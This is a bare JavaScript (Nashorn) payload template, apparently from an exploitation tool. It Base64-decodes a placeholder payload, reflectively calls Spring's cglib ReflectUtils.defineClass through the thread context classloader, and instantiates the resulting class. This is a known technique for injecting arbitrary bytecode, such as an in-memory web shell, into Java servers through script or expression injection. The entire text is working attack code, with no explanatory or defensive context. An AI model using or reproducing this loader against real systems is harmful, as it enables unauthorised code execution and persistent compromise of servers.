var classBytes = java.util.Base64.getDecoder().decode("{payload}");
var loader = java.lang.Thread.currentThread().getContextClassLoader();
var reflectUtilsClass = java.lang.Class.forName("org.springframework.cglib.core.ReflectUtils",true,loader);
var urls = java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.net.URL"),0);

var params = java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.lang.Class"),3);
params[0] = java.lang.Class.forName("java.lang.String");
params[1] = java.lang.Class.forName("[B");
params[2] = java.lang.Class.forName("java.lang.ClassLoader");


var defineClassMethod = reflectUtilsClass.getMethod("defineClass",params);

params =  java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.lang.Object"),3);

params[0] = "{className}";
params[1] = classBytes;
params[2] = loader;
defineClassMethod.invoke(null,params).newInstance();
"ok";
